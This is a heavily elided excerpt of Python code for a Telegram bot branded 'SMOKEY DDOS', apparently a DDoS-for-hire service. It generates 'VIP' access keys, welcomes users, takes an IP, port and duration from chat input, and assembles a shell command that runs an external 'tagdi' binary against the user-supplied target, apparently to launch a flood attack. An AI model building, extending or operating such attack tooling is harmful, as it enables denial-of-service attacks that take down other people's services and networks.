...
def create_random_key(length=15):
    ...
    custom_key = f"VIP-SMOKEY-{random_key}"
    return custom_key
...
def start_command(message):
    ...
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 *SMOKEY DDOS™* 𝗯𝗼𝘁 !", reply_markup=markup, parse_mode='Markdown')
    bot.send_message(
        message.chat.id,
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if time > 5000:
                ...
                full_command = f"./tagdi {IP} {PORT} {DURATION} 1200"
